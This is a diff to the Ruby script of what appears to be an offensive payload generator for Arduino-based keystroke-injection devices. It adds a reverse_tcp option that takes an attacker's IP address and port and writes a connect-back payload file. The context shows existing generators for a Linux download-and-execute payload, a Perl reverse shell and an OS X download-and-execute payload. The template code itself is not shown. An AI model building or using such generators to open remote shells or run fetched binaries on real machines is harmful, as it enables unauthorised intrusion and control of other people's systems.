@@ -654,7 +654,17 @@ def drop_jar
   search_replace("./lib/src/drop_jar.tmp","#$output_path/output/drop_jar.ino",filename)
 end
 
+def reverse_tcp
+  puts"\nThis payload connects back to the attacker's machine on the given IP address and port.".bold
+  puts"\nSee this blog post for detailed usage: "
+  ipaddr = input("Enter the IP address to which the target will connect back: ")
+  port  = input("Enter the port on which the target will connect back: ")
+  search_replace("./lib/src/reverse_tcp.ino","#$output_path/output/reverse_tcp.ino", ipaddr,port)
 
+
+end
+
+######################### Linux payloads start here ###########################
 def linux_download_execute
   puts"\nThis payload downloads an elf in text format, changes it back to elf using xxd and executes it.".bold
   puts"You must manually convert and upload an elf to text.".bold
@@ -726,6 +736,8 @@ def linux_perl_reverse_shell()
   search_replace("./lib/src/linux_perl_reverse_shell.ino","#$output_path/output/linux_perl_reverse_shell.ino",ip, port)
 
 end
+
+######################### OS X payloads start here ###########################
 
 def osx_download_execute()
   puts"\nThis payload downloads a shellcode in text format, changes it back to elf using xxd and executes it.".bold
